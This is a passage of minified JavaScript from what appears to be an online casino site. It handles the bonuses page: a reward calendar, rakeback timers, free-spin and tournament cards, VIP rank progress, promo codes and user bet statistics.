            t.innerHTML = day.substr(-2), t = e.getElementsByClassName("mth")[0], t.innerHTML = h.substr(-2), t = e.getElementsByClassName("mtm")[0], t.innerHTML = m.substr(-2), t = e.getElementsByClassName("mts")[0], t.innerHTML = s.substr(-2), 1 != n && 2 != n || (e = document.getElementById("cfs0"), t = e.getElementsByClassName("mtd")[0], t.innerHTML = day.substr(-2), t = e.getElementsByClassName("mth")[0], t.innerHTML = h.substr(-2), t = e.getElementsByClassName("mtm")[0], t.innerHTML = m.substr(-2), t = e.getElementsByClassName("mts")[0], t.innerHTML = s.substr(-2))
        } else bl = document.getElementById(`cfs${a}`), l = bl.getElementsByClassName("mtd")[0], l.innerHTML = day.substr(-2), l = bl.getElementsByClassName("mth")[0], l.innerHTML = h.substr(-2), l = bl.getElementsByClassName("mtm")[0], l.innerHTML = m.substr(-2), l = bl.getElementsByClassName("mts")[0], l.innerHTML = s.substr(-2)
    },
    makeCardsFS = e => `<div id="cfs${e.id}" class="cfs cfs50 ops">\n  <div class="cfs_title" data-cur="CANDY">\n      <div>$150 Free Tournament</div>\n      <div onclick="openTours('candy');" class="cfs_de">Details</div>\n  </div>\n  <div class="cfs_top">Every 12 hours</div>\n  <div class="cfs_i_wr">\n  <img class="cfs_image" src="/assets/img/promo2/tourss.svg" alt="Bonus I">\n  </div>\n  <div class="cfs_text">Your place: <span>${e.place}</span></div>\n  <div class="cfs_text">Your prize: <span>\n  <img src="/assets/coins/${e.currency}.svg" alt="Coins">\n  <span id="ctlk2">${Number(e.amount).toFixed(2)}</span>\n  </span></div>\n  <div class="cfs_btns">\n  <button onclick="getFTMon(this)" data-id="${e.id}" class="ui-button btn_green button-normal s-gray">\n      <div class="button-inner">Claim</div>\n  </button>\n  <div class="cfs_i_t">\n          <div class="cfs_t_i">\n              <div class="cfs_t_c mtd">00</div>\n              <div class="cfs_t_n">Days</div>\n          </div>\n          <div class="cfs_t_i">\n              <div class="cfs_t_c mth">00</div>\n              <div class="cfs_t_n">Hours</div>\n          </div>\n          <div class="cfs_t_i">\n              <div class="cfs_t_c mtm">00</div>\n              <div class="cfs_t_n">Min</div>\n          </div>\n          <div class="cfs_t_i">\n              <div class="cfs_t_c mts">00</div>\n              <div class="cfs_t_n">Sec</div>\n          </div>\n  </div> \n  </div>\n</div>`,
    bonsSt = 0,
    fresp72 = [],
    fresp73 = [],
    couTime555 = [],
    stCalend = 5,
    calendarSl = e => {
        let t = gC("bwww_l42")[0];
        if (window.innerWidth > 1025) 1 == e ? 5 == stCalend || 2 == stCalend ? (stCalend = 2, t.classList.add("cslf02")) : (stCalend = 5, t.classList.remove("cslf01")) : 5 == stCalend || 1 == stCalend ? (stCalend = 1, t.classList.add("cslf01")) : (stCalend = 5, t.classList.remove("cslf02"));
        else {
            for (let e = 0; e < 10; e++) t.classList.remove("cslf" + e);
            1 == e && 8 != stCalend && (stCalend += 1), 0 == e && 1 != stCalend && (stCalend -= 1), t.classList.add("cslf" + stCalend)
        }
    },
    getZabor = async (e, t = 0, s) => {
        s.disabled = !0;
        let a = new FormData;
        a.set("action", e), 0 != t && a.set("day", t);
        let n = await axios({
            method: "post",
            url: "/user/promo_user.php",
            data: a,
            headers: {
                "Content-Type": "multipart/form-data"
            }
        }).catch((function(e) {
            createNotifyL(1, e.message, lp.Error), s.disabled = !1
        }));
        n = n.data, 0 == n.error ? (Swal.fire({
            title: lp["Success action"],
            text: n.message,
            icon: "success"
        }), getAllBonuses(n)) : (s.disabled = !1, createNotifyL(1, n.message, lp.Error))
    }, evjis777 = () => {
        let e = window.addEventListener ? "addEventListener" : "attachEvent";
        (0, window[e])("attachEvent" == e ? "onmessage" : "message", (function(e) {
            if ("{" == e.data[0]) {
                let t = JSON.parse(e.data);
                if (t.game_field_height) {
                    let e = t.game_field_height,
                        s = document.getElementById("iframe-desc6");
                    null != s && (s.style.height = e + "px", s.style.maxHeight = e + "px", s.style.minHeight = e + "px")
                }
                if (t.go1) {
                    let e = gD("cross246");
                    e && e.click()
                }
                t.dep1 && closeVeriff()
            }
        }), !1)
    };
evjis777();
let closeBonuses = () => {
        fresp73.forEach((e => clearInterval(e.id))), fresp72.forEach((e => clearInterval(e.id))), couTime555.forEach((e => clearInterval(e.id))), couTime555 = [], fresp72 = [], fresp73 = [];
        let e = document.getElementsByClassName("cfs");
        Array.from(e).forEach((e => {
            "cfs0" != e.getAttribute("id") && (e.outerHTML = "")
        })), e = document.getElementsByClassName("mod_cont"), Array.from(e).forEach((e => {
            "m4Cur13" != e.getAttribute("id") && "mb13857" != e.getAttribute("id") && (e.outerHTML = "")
        })), e = document.getElementById("m4Cur13"), e.style.display = "none", bonsSt = 0
    },
    allBonusesCal = e => {
        let t = gC("bwww_l42")[0],
            s = "";
        t && (t.innerHTML = ""), t = gC("bslw_l41")[0], t.innerHTML = "";
        let a = Math.floor(Date.now() / 1e3),
            n = 60 * (new Date).getTimezoneOffset();
        a += n;
        let r = Math.floor(new Date(1e3 * a).setHours(0, 0, 0, 0) / 1e3),
            o = Math.floor(new Date(1e3 * a).setHours(23, 59, 59, 999) / 1e3),
            i = 0,
            l = e.calendar,
            c = Object.keys(l);
        c = c.map((e => Number(e) + n)), l = Object.entries(l), l = l.map((e => [Number(e[0]) + n, e[1]]));
        let d = c.findIndex((e => e >= r && e <= o)); - 1 == d && (c.push(a), l.push([a, {}])), d = -1 == d ? a : c[d];
        let u = Math.floor(new Date(1e3 * d).getDay());
        u = 0 == u ? 6 : u - 1;
        const p = d - 86400 * (28 + u);
        u = 6 - u;
        const m = d + 86400 * (28 + u),
            f = Math.round((m - p) / 86400) + 1;
        let h = c.map((e => new Date(1e3 * e).getDate() + "0" + new Date(1e3 * e).getMonth()));
        for (let e = 0; e < f; e++) {
            let t = p + 86400 * e,
                s = new Date(1e3 * t).getDate() + "0" + new Date(1e3 * t).getMonth();
            h.includes(s) || (l.push([t, {}]), c.splice(e, 0, t))
        }
        l.sort();
        let g = 0,
            y = 0;
        for (let [e, t] of l) {
            i += 1;
            let l = 0,
                c = 0,
                d = 0,
                u = "",
                p = show = 1;
            o > e + 172800 && (show = 0, p = 0), e > o && (show = 0);
            let m = e > o && e < o + 86400;
            e > o + 86400 || a < r + 57600 && m || (u = '<div class="blci_a1">\n      <div class="blli_a2">');
            let f = 0;
            for (const [s, n] of Object.entries(t)) {
                let t = "";
                "dop" != s && (!parseInt(n.z) && show && (t = "gold88"), !parseInt(n.z) && show && e >= r && e <= o && ("b" == s && a < r + 28800 && (t = "clock"), "c" == s && a < r + 57600 && (t = "clock"), "clock" == t && n.s && (g += Number(n.s))), m && a > r + 57600 && (t = "clock"), e > o && n.s && (g += Number(n.s)), parseInt(n.z) && (t = "win88", f += 1), parseInt(n.z) || p || (t = "lose88"), u += `<div class="bcc_a3 ${t}">\n            <img src="/assets/img/promo2/${t}.svg"></div>`), n.s && (l += Number(n.s)), n.s && "clock" != t && !parseInt(n.z, 10) && (d += Number(n.s)), parseInt(n.z, 10) && n.s && (c += Number(n.s))
            }
            if (e > o + 86400 || a < r + 57600 && m) u = '<img src="../assets/img/promo2/goldsArra.svg" class="goldsArra">';
            else {
                if (t.dop) {
                    u += '</div><div class="blli_a2">';
                    for (const [e, s] of Object.entries(t.dop)) u += `<img src="../assets/img/promo2/${e}.svg">`
                }
                u += "</div>\n      </div>"
            }
            let h = Object.entries(t).length;
            t.dop && (h -= 1);
            let v = f + " / " + h;
            l && show && d && (y += d, v = `<button onclick="getZabor('click_getMoney',${Number(e)-n},this)" class="bbt_a6" style="width: 144px;">Claim $${window.truncatorJet(Number(d),2,2)}</button>`);
            let b = `<span>$${window.truncatorJet(Number(c),2,2)}<span> / $${window.truncatorJet(Number(l),2,2)}</span></span>`;
            0 == h && (u = "<h2>No reward</h2>", v = "", b = "");
            let w = "boit_l41",
                C = 0;
            if (e >= r && e <= o && (w = "bolt_a7", calCenter = i - 1, 0 != d || a > r + 57600 || (C = 1), 0 == d && 0 == C && (v = f + " / " + h)), C || e > o && e < o + 86400 && a > r + 57600) {
                let s = Object.entries(t),
                    n = 0;
                if (s && (n = s[0]), n && (n = n[1]), n && (n = n.s), n && (n = Number(n).toFixed(2)), n) {
                    let t = o;
                    if (C) {
                        let e = r;
                        a < e + 28800 && (e += 28800, s && (n = s[1]), n && (n = n[1]), n && (n = n.s), n && (n = Number(n).toFixed(2))), a < e + 57600 && (e += 57600, s && (n = s[1]), n && (n = n[1]), n && (n = n.s), n && (n = Number(n).toFixed(2))), t = e
                    }
                    let i = convertSeconds(t - a);
                    n = n || ">0.01", v = `\n      <div class="bcla_a3">Claim <span>$${n}</span> in<div class="bti_f9">\n      <span class="tt3${e}">${i.hours}:${i.minutes}:${i.seconds}</span>\n      </div>\n      </div>`;
                    let l = 1,
                        c = setInterval((() => {
                            let s = t - l - a;
                            if (l += 1, 0 == s) getAllBupdateCal(), clearInterval(c);
                            else {
                                let t = convertSeconds(s),
                                    a = document.getElementsByClassName("tt3" + e);
                                Array.from(a).forEach((e => e.innerHTML = `${t.hours}:${t.minutes}:${t.seconds}`)), 0 == a.length && clearInterval(c)
                            }
                        }), 1e3);
                    fresp72.push({
                        id: c
                    })
                }
            }
            let E = new Date(1e3 * e);
            s += `<div class="${w} swiper-slide">\n      <div class="boitw_l41">\n          <div class="bomd_l47">${E.toLocaleString(`${lngGame}-${lngGame.toUpperCase()}`,{month:"long"})} ${E.getDate()}</div>\n          <div class="bosu_l47">${b}</div>\n      </div>\n      <div class="bosl_l7">\n          ${u}\n      </div>\n      <div class="bbwr_l42">${v}</div>\n  </div>`
        }
        t = gC("bwww_l42")[0], t && (t.innerHTML = s), t = gC("bslw_l41")[0], t.innerHTML = s, t = gD("tot_cla44"), g = window.truncatorJet(Number(g), 2, 2), t.innerHTML = g, t = gD("tot_pen44"), y = window.truncatorJet(Number(y), 2, 2), t.innerHTML = y, statusMainPage = 40, setTimeout((() => {
            createSliders()
        }), 0)
    },
    allBonusesState = e => {
        let t = gD("tot_bd356");
        t && (t.innerHTML = "$" + window.truncatorJet(Number(e.sum_total_daily), 2, 2)), t = gD("tot_bm356"), t && (t.innerHTML = "$" + window.truncatorJet(Number(e.sum_total_monthly), 2, 2)), t = gD("tot_bra356"), t && (t.innerHTML = "$" + window.truncatorJet(Number(e.sum_total_rackeback), 2, 2)), t = gD("tot_brr356"), t && (t.innerHTML = "$" + window.truncatorJet(Number(e.sum_total_ranks), 2, 2)), t = gD("tot_bw356"), t && (t.innerHTML = "$" + window.truncatorJet(Number(e.sum_total_weekly), 2, 2)), t = gD("tot_br356");
        let s = Number(1 * e.sum_total_daily + 1 * e.sum_total_monthly + 1 * e.sum_total_rackeback + 1 * e.sum_total_ranks + 1 * e.sum_total_weekly);
        t && (t.innerHTML = "$" + window.truncatorJet(Number(s), 2, 2))
    },
    convertSeconds = e => {
        let t = "0" + Math.floor(e / 86400),
            s = "0" + Math.floor(e % 86400 / 3600),
            a = "0" + Math.floor(e % 3600 / 60),
            n = "0" + e % 60;
        return {
            days: t.substr(-2),
            hours: s.substr(-2),
            minutes: a.substr(-2),
            seconds: n.substr(-2)
        }
    },
    getAllBupdateCal = async (e = 1) => {
        let t = new FormData;
        t.set("action", "getAll");
        let s = await axios({
            method: "post",
            url: "/user/promo_user.php",
            data: t,
            headers: {
                "Content-Type": "multipart/form-data"
            }
        }).catch((function(e) {
            createNotifyL(1, e.message, lp.Error), bt.disabled = !1
        }));
        s = s.data, 0 == s.error ? 1 == e ? allBonusesCal(s) : getAllBonuses(s) : createNotifyL(1, s.message, lp.Error)
    }, getAllBonuses = e => {
        if (0 == e.error) {
            let t;
            fresp73.forEach((e => clearInterval(e.id))), fresp73 = [];
            let s = gD("rke398");
            s.innerHTML = e.proc_rakeboost, 0 == Number(e.time_rakeboost) ? s.parentNode.parentNode.classList.add("opsjrb") : s.parentNode.parentNode.classList.remove("opsjrb");
            let a = e.rackebacklastClick - e.stime + 1800;
            if (s = gD("rbtn912"), Number(e.rackeback) < .01 || a > 0) {
                if (s.disabled = !0, s.parentNode.classList.remove("opj846"), a > 0) {
                    s.parentNode.classList.add("opj846"), s.disabled = !0;
                    let t = 1,
                        n = convertSeconds(a);
                    document.getElementsByClassName("tt3Rakeback")[0].innerHTML = `${n.hours}:${n.minutes}:${n.seconds}`;
                    let r = setInterval((() => {
                        let s = a - t;
                        if (0 == s) {
                            let t = gD("rbtn912");
                            t.parentNode.classList.remove("opj846"), Number(userLevel) >= 2 ? t.disabled = !1 : t.disabled = !0, t = document.getElementsByClassName("tt4Rakeback")[0], t.innerHTML = " $" + window.truncatorJet(Number(e.rackeback), 2, 2), clearInterval(r)
                        } else {
                            t += 1;
                            let e = convertSeconds(s);
                            document.getElementsByClassName("tt3Rakeback")[0].innerHTML = `${e.hours}:${e.minutes}:${e.seconds}`
                        }
                    }), 1e3);
                    fresp73.push({
                        id: r
                    })
                }
            } else s.parentNode.classList.remove("opj846"), Number(userLevel) >= 2 ? s.disabled = !1 : s.disabled = !0, s = document.getElementsByClassName("tt4Rakeback")[0], s.innerHTML = " $" + window.truncatorJet(Number(e.rackeback), 2, 2);
            [
                [e.time_wheel, 10, 0, 0],
                [e.time_bonus_daily - e.stime, 7, 0, e.sum_bonus_daily],
                [e.time_bonus_weekly - e.stime, 8, 1, e.sum_bonus_weekly],
                [e.time_bonus_monthly - e.stime, 9, 1, e.sum_bonus_monthly],
                [e.time_rakeboost, 11, 0, 0]
            ].forEach((e => {
                if (s = gD("rrrbt" + e[1]), Number(e[0]) > 0 && Number(e[3]) < .01) {
                    s && s.parentNode.classList.add("opj846"), s && (s.disabled = !0);
                    let t = 1,
                        a = e[0],
                        n = convertSeconds(a),
                        r = document.getElementsByClassName("ttjhl" + e[1])[0];
                    ti = `${n.hours}:${n.minutes}:${n.seconds}`, 1 == e[2] && (ti = `${n.days}:` + ti), r && (r.innerHTML = ti);
                    let o = setInterval((() => {
                        let s = a - t;
                        if (0 == s) {
                            let t = gD("rrrbt" + e[1]);
                            t && t.parentNode.classList.remove("opj846"), t && (t.disabled = !1), t = gC("ttjhu" + e[1])[0], t && (t.innerHTML = window.truncatorJet(Number(e[3]), 2, 2)), clearInterval(o), t = gD("rke398"), t && t.parentNode.parentNode.classList.add("opsjrb")
                        } else {
                            t += 1;
                            let a = convertSeconds(s),
                                n = document.getElementsByClassName("ttjhl" + e[1])[0];
                            s = `${a.hours}:${a.minutes}:${a.seconds}`, 1 == e[2] && (s = `${a.days}:` + s), n && (n.innerHTML = s)
                        }
                    }), 1e3);
                    fresp73.push({
                        id: o
                    })
                } else s && s.parentNode.classList.remove("opj846"), s && (s.disabled = !1), s = gC("ttjhu" + e[1])[0], s && (s.innerHTML = window.truncatorJet(Number(e[3]), 2, 2))
            })), allBonusesState(e), t = gD("rankT321"), t && (t.innerHTML = Number(userLevel) > 0 ? "You have " + userLevel + " rank" : "You don't have a rank yet"), t = gD("rankP321"), t && (t.innerHTML = window.truncatorJet(Number(userLevelProc), 2, 2) + "%"), t = gD("rankCi321"), t && (t.style.strokeDasharray = `${32*Math.PI}, ${32*Math.PI}`), t && (t.style.strokeDashoffset = (100 - Number(userLevelProc)) / 100 * (32 * Math.PI)), t = gD("rankI321"), t = t.setAttribute("src", `../assets/image/vipclub/${userLevel}.png?x=15`), t = gD("rankY32"), t && (t.innerHTML = "$" + window.truncatorJet(Number(e.sum_bets), 2, 2));
            let n = e.unblockAmount,
                r = e.blockAmount,
                o = vipLevels.findIndex((e => e[0] == userLevel));
            t = gD("rankA32"), t && (t.innerHTML = Number(vipLevels[o + 1][1].sum_bets).toFixed(2)), o = [vipLevels[o], vipLevels[o + 1]], o.forEach(((e, s) => {
                t = gC("br89_i0")[s], t && (t = t.setAttribute("src", `../assets/image/vipclub/${e[0]}.png?x=15`)), t = gC("br89_w0")[s], t && (t.innerHTML = e[1].sum_bets), t = gC("br89_b0")[s], t && (t.innerHTML = e[1].fix), t = gC("br89_r0")[s], t && (t.innerHTML = e[1].rakeback + "%")
            })), setjetinfo(n, r, 1), allBonusesCal(e)
        } else createNotifyL(1, e.message, lp.Error)
    }, openBonuses = async e => {
        if (3 != e && "Bonuses" == pageNameM) return;
        pageNameM = "Bonuses", await openPageSite("bonuses", "bonuses");
        let t = gC("bon_regno24")[0],
            s = gC("bon_reg24")[0];
        if (3 == e) return t.style.display = "block", s.style.display = "none", openHistory("?about_bons", 2), void(pageNameM = "About Bonuses");
        if (setTitlePage(pageNameM), t.style.display = "none", s.style.display = "block", openHistory("?bonuses", 2), 1 != window.user_il) return openHome(), void openMobileLogin();
        let a, n = document.getElementById("coins_preloadOpen");
        n && (n.style.display = "flex"), bonsSt = 1, openHistory("?bonuses", 2), couTime555 = [], fresp72 = [];
        let r = [],
            o = new FormData;
        o.set("action", "getUserFSreg");
        try {
            a = await axios({
                method: "post",
                url: "/user/func.php",
                data: o,
                headers: {
                    "Content-Type": "multipart/form-data"
                }
            }), a = a.data
        } catch (e) {
            a = {
                error: 1,
                message: ""
            }
        }
        if (0 == a.error) {
            let e = 2;
            if (a.candy) {
                let t = gC("cfs_wr")[0];
                if (0 != a.candy.length) {
                    let s = "";
                    e = 1, a.candy.forEach((e => {
                        s += makeCardsFS(e)
                    })), t.innerHTML = s + t.innerHTML, a.candy.forEach((e => {
                        helpTimers(e, a, document, 3)
                    }))
                }
            }
            let t = gD("cfs0"),
                s = 0;
            if (a.current[0] && (s = Number(a.current[0].enable)), r = a.current, r.length > 0) {
                if (t.classList.add("ops"), t.classList.remove("twostage23"), t.classList.remove("twostage11"), t.classList.remove("twostage22"), t.classList.remove("twostage33"), e = 1, 0 == s && (t.classList.add("twostage11"), t = document.getElementById("cfstt0"), t.innerHTML = r[0].spins), 1 == s) {
                    t.classList.add("twostage33"), t = document.getElementById("cfib3"), t.innerHTML = "x" + r[0].bon_wager_mult;
                    let e = document.getElementById("cfs0_bt");
                    e.setAttribute("onclick", "opFsGa(this)"), e.dataset.id = r[0].id, t = document.getElementById("cfstt0"), t.innerHTML = r[0].spins
                }
                if (2 == s && (t.classList.add("twostage23"), t = document.getElementById("cfstt0"), t.innerHTML = r[0].spins, t = document.getElementById("cfib3"), t.innerHTML = "x" + r[0].bon_wager_mult, t = document.getElementById("cfswB2"), t.innerHTML = r[0].bon_fs_win_usd), 3 == s || 6 == s) {
                    t.classList.add("twostage22"), 6 == s && t.classList.add("twostage66"), t = document.getElementById("cfsuB2");
                    let e = Number(r[0].bon_wager_allsum_usd) - Number(r[0].bon_wager_left);
                    e = window.truncatorJet(Number(e), 2, 2), t.innerHTML = e, t = document.getElementById("cfskB2"), t.innerHTML = r[0].bon_wager_allsum_usd, t = document.getElementById("cfstt0"), t.innerHTML = r[0].spins, t = document.getElementById("cfswB2"), t.innerHTML = r[0].bon_fs_win_usd, t = document.getElementById("cfib2"), t.innerHTML = r[0].bon_wager_mult;
                    let a = (Number(r[0].bon_wager_allsum_usd) - Number(r[0].bon_wager_left)) / Number(r[0].bon_wager_allsum_usd) * 100;
                    isNaN(a) && (a = 0), a >= 100 && (a = 100), a = window.truncatorJet(Number(a), 2, 2), t = document.getElementById("cfib6"), t.innerHTML = a + "%", t = document.getElementById("cfoob2"), t.style.width = a + "%"
                }
            } else t.classList.remove("ops")
        } else createNotifyL(1, a.message, lp.Error);
        if (o = new FormData, o.set("action", "getAll"), a = await axios({
                method: "post",
                url: "/user/promo_user.php",
                data: o,
                headers: {
                    "Content-Type": "multipart/form-data"
                }
            }).catch((function(e) {
                createNotifyL(1, e.message, lp.Error)
            })), a = a.data, getAllBonuses(a), o = new FormData, o.set("action", "getUserFS"), a = await axios({
                method: "post",
                url: "/user/func.php",
                data: o,
                headers: {
                    "Content-Type": "multipart/form-data"
                }
            }).catch((function(e) {
                createNotifyL(1, e.message, lp.Error)
            })), a = a.data, 0 == a.error) {
            let e = document,
                t = e.getElementById("mbCur13").cloneNode(!0),
                s = "";
            0 == a.current.length && (t.style.display = "none"), r = r.concat(a.current), r.forEach((e => {
                let a = casinoGames.find((t => t[0] == e.game));
                if (void 0 !== a) {
                    let n = t.getElementsByClassName("cfs_top")[0];
                    n.innerHTML = a[1].n, n = t.getElementsByClassName("cfs_title")[0], n.innerHTML = e.spins + " free spins";
                    let r = getImg5(a),
                        o = r.href,
                        i = r.hrefx2;
                    n = t.getElementsByTagName("img")[0], n.setAttribute("srcset", `${i} 2x,${o} 1x`), n = t.getElementsByClassName("mod_cont")[0], n.setAttribute("id", `itFS${e.id}`), n.dataset.id = e.id, 0 != Number(e.enable) && n.setAttribute("onclick", "opFsGa(this)"), 0 == Number(e.enable) ? n.classList.add("regFs333") : n.classList.remove("regFs333"), 1 == Number(e.enable) ? n.classList.add("regFs444") : n.classList.remove("regFs444"), Number(e.enable) > 1 ? n.classList.add("regFs555") : n.classList.remove("regFs555"), e.enable && (document.getElementById("nameG75432").innerHTML = a[1].n), s += n.outerHTML
                } else e.until = null
            })), e.getElementById("mbCur12").innerHTML += s, r.forEach((t => {
                helpTimers(t, a, e)
            })), 0 != a.condition.length && (t = e.getElementById("m4Cur13"), s = "", a.condition.forEach((e => {
                let a = casinoGames.find((t => t[0] == e.game)),
                    n = t.getElementsByClassName("mtdn")[0];
                n.innerHTML = a[1].n, n = t.getElementsByClassName("mtds")[0], n.innerHTML = e.spins, n = t.getElementsByClassName("mtdw")[0], e.wager_cur = e.wager_cur ? e.wager_cur : "0", e.wager_all = e.wager_all ? e.wager_all : "0", n.innerHTML = e.wager_cur + " / " + e.wager_all, n = t.getElementsByClassName("mod_cond_td")[0], 1 == e.is_active ? n.classList.add("active") : n.classList.remove("active"), n.dataset.id = e.id, s += n.outerHTML
            })), e.getElementById("mbCon12").innerHTML = s, t.style.display = "")
        } else createNotifyL(1, a.message, lp.Error);
        bl = gC("cfs_wr")[0], bl && (0 != bl.clientHeight ? bl.classList.add("mn81") : bl.classList.remove("mn81")), n && (n.style.display = "")
    }, chFrSp = async e => {
        if (!e.classList.contains("active")) {
            let t = e.parentNode.getElementsByClassName("active")[0];
            t && t.classList.remove("active"), e.classList.add("active");
            let s = new FormData;
            s.set("action", "userClickCondition"), s.set("idFS", e.dataset.id), await axios({
                method: "post",
                url: "/user/func.php",
                data: s,
                headers: {
                    "Content-Type": "multipart/form-data"
                }
            }).catch((function(e) {
                createNotifyL(1, e.message, lp.Error)
            }))
        }
    }, openRakeback = async () => {
        if (1 != window.user_il) return void openMobileLogin();
        await modalOpenNew("modal_rakeback", "rakeback"), document.getElementsByClassName("modal_rakeback")[0].classList.add("active"), errFixCoins(), openHistory("?" + window.location.href.split("?")[1] + "&rakeback", 1);
        let e = new FormData;
        e.set("action", "getRakebackInfo"), axios({
            method: "post",
            url: "/user/func.php",
            data: e,
            headers: {
                "Content-Type": "multipart/form-data"
            }
        }).then((e => {
            if (0 == e.data.error) {
                let t = 1e3 * e.data.lastClick - 1e3 * e.data.stime + 18e5,
                    s = document.getElementById("rake_btn1"),
                    a = document.getElementById("circle_r117"),
                    n = document.getElementById("rake_time");
                if (Number(e.data.amount) <= 0 ? s.disabled = !0 : Number(userLevel) >= 2 && (s.disabled = !1), t > 0) {
                    s.disabled = !0, t = new Date(t);
                    let e = t.getMinutes() < 10 ? "0" + t.getMinutes() : t.getMinutes();
                    n.innerHTML = e, a.style.strokeDasharray = `${58*Math.PI}, ${58*Math.PI}`, a.style.strokeDashoffset = (100 - (30 - Number(e)) / 30 * 100) / 100 * (58 * Math.PI)
                }
                document.getElementById("a_rake1").innerHTML = e.data.amount
            } else Swal.fire({
                title: lp.Error,
                text: e.data.message,
                icon: "error"
            })
        })).catch((function(e) {
            createNotifyL(1, e.message, lp.Error)
        }))
    }, closeRakeback = e => {
        document.getElementsByClassName("modal_rakeback")[0].classList.remove("active"), 1 != e && errUnFixCoins(), closeHistory("&rakeback")
    }, closeTrans = e => {
        document.getElementsByClassName("modal_trans")[0].classList.remove("active"), 1 != e && errUnFixCoins(), closeHistory("&transactions")
    }, closeDeposite = () => {
        let e = document.getElementById("coins_preloadOpen");
        e && (e.style.display = ""), e = document.getElementById("btnDep111"), e && (e.disabled = !1), document.getElementsByClassName("modal_deposite")[0].classList.remove("active"), errUnFixCoins(), -1 != window.location.href.indexOf("=buyCrypto") ? closeHistory("&deposite=buyCrypto") : closeHistory("&deposite"), underClose(5)
    }, openProfile = async () => {
        if (1 != window.user_il) return void openMobileLogin();
        await modalOpenNew("modal_profile", "profile"), setAvatarUser(), document.getElementsByClassName("modal_profile")[0].classList.add("active"), errFixCoins(), await getUserStatInfo(1), getUserFavGames(), openHistory("?" + window.location.href.split("?")[1] + "&profile", 1)
    }, getStatUser = () => {
        let e = arrayUserInfo.filter((e => -1 == e[0].indexOf("countWin") && -1 == e[0].indexOf("countBet")));
        e.sort(((e, t) => {
            if (Number(e[1]) < Number(t[1])) return -1
        })), e = e.reverse();
        let t = [];
        e.forEach((e => {
            t.push({
                name: e[0],
                amount: e[1],
                bets: "",
                win: ""
            })
        })), t.forEach((e => {
            e.bets = Object.fromEntries(arrayUserInfo)["countBet_" + e.name], e.win = Object.fromEntries(arrayUserInfo)["countWin_" + e.name]
        }));
        let s = document.getElementsByClassName("stat_bets1")[0],
            a = s.dataset;
        s.innerHTML = "", t.forEach((e => {
            let t = e.name.charAt(0).toUpperCase() + e.name.slice(1),
                n = `openGame('${e.name}')`;
            "dealers" == e.name && (n = "openSlots('live_cas')"), "slots" == e.name && (n = "openSlots()"), "sport" == e.name && (n = "openSport()"), s.innerHTML += `\n        <div onclick="${n};closeStatic()" class="tr">\n            <div class="td">\n            <span>${a.game}</span>\n            <div class='fd117'>\n            <img loading="lazy" class="coin-icon" src="/assets/svgGame/${t}.svg">${t}\n            </div>\n            </div>\n            <div class="td">\n            <span>${a.win}</span>\n            ${e.win}\n            </div>\n            <div class="td">\n            <span>${a.num}</span>\n            ${e.bets}</div>\n            <div class="td">\n            <span>${a.am}</span>\n            $${window.truncatorNumb(Number(e.amount),2)}\n            </div>\n        </div>`
        }))
    }, getUserFavGames = () => {
        let e = arrayUserInfo.filter((e => -1 == e[0].indexOf("countWin") && -1 == e[0].indexOf("countBet") && -1 == e[0].indexOf("slots")));
        e.sort(((e, t) => {
            if (Number(e[1]) < Number(t[1])) return -1
        })), e = e.reverse(), e = e.splice(0, 3);
        let t = document.getElementsByClassName("favGame_back"),
            s = document.getElementsByClassName("favGame_name"),
            a = document.getElementsByClassName("favGame_title"),
            n = "";
        amounts = document.getElementsByClassName("favGame_amount"), e.forEach(((e, r) => {
            let o = () => {
                openGame(e[0])
            };
            "dealers" == e[0] && (o = () => {
                openSlots("live_cas")
            }), "sport" == e[0] && (o = () => {
                openSport()
            }), t[r].parentNode.onclick = () => {
                closeProfile(), o()
            }, t[r].style.backgroundImage = `url(/assets/games/${e[0]}-sq.png?x=2)`, s[r].innerHTML = e[0], a[r].innerHTML = e[0], amounts[r].innerHTML = window.truncatorNumb(Number(e[1]), 2), n = t[r].parentNode.parentNode.dataset, n = n[`${e[0]}`], a[r].nextSibling.innerHTML = n
        }))
    };
window.sendPromoF = (e, t) => {
    if (1 != window.user_il) return void openMobileLogin();
    let s = document.getElementById("textPromo" + t);
    s.value.length > 0 && "0" != user_in ? (e.set("action", "enterPromocode2"), e.set("code", s.value), axios.post("/user/func.php", e).then((e => {
        0 == e.data.error ? createNotifyL(2, e.data.message || "&nbsp;", lp.Success) : (createNotifyL(1, e.data.message || "&nbsp;", lp.Error), 2 == e.data.error && (document.getElementById("btn_verif").style.display = "block", asyFunc(openSettings, openSlotSettings, "Verify")))
    })).catch((function(e) {
        createNotifyL(1, e.message, lp.Error)
    }))) : createNotifyL(1, "", lp.Error), s.value = ""
};
let arrayUserInfo, is_avatsOp, getMoneyAffil = () => {
        if ("0" != user_in) {
            let e = new FormData;
            e.set("action", "giveAffilMoney"), axios.post("/user/func.php", e).then((e => {
                0 == e.data.error ? createNotifyL(2, e.data.message || "&nbsp;", lp.Success) : createNotifyL(1, e.data.message || "&nbsp;", lp.Error)
            })).catch((function(e) {
                createNotifyL(1, e.message, lp.Error)
            }))
        } else createNotifyL(1, lp["Not login"], lp.Error)
    },
    getUserStatInfo = async e => {
        let t = new FormData;
        t.set("action", "getUserStatInfo"), await axios.post("/user/func.php", t).then((t => {
            delete t.data.idUser;
            let s = t.data.wager7days;
            delete t.data.wager7days;
            let a = document.getElementById("wager7d7");
            a && (a.innerHTML = s || "0.00"), a = document.getElementById("dateReg77"), a && (a.innerHTML = dateReg77 || "01.01.2000"), a = document.getElementById("dateNick77"), a && (a.innerHTML = userSiteNick);
            let n = Object.entries(t.data);
            arrayUserInfo = n;
            let r = 0;
            n.forEach((e => {
                -1 != e[0].indexOf("countWin") && (r += Number(e[1]))
            }));
            let o = 0;
            n.forEach((e => {
                -1 != e[0].indexOf("countBet") && (o += Number(e[1]))
            }));
            let i = 0;
            n.forEach((e => {
                -1 == e[0].indexOf("countWin") && -1 == e[0].indexOf("countBet") && (i += Number(e[1]))
            })), i = window.truncatorNumb(i, 2);
            let l = document.getElementById("allWins" + e);
            l.innerHTML = r, l = document.getElementById("allBets" + e), l.innerHTML = o, l = document.getElementById("allAmount" + e), l.innerHTML = i
        })).catch((function(e) {
            createNotifyL(1, e.message, lp.Error)
        }))
    }, stNotTg = 4, chNotif = (e, t) => {
        let s = document.getElementsByClassName("notify_tab117_" + Number(e))[0];
        if (s.classList.add("is-active"), s = document.getElementsByClassName("notify_tab117_" + Number(!e))[0], s.classList.remove("is-active"), s = document.getElementsByClassName("notify_system117_" + Number(e))[0], s.style.display = "block", s = document.getElementsByClassName("notify_system117_" + Number(!e))[0], s.style.display = "none", 2 != t)
            if (1 == e) {
                if (3 == stNotTg) return void changeCNot(1);
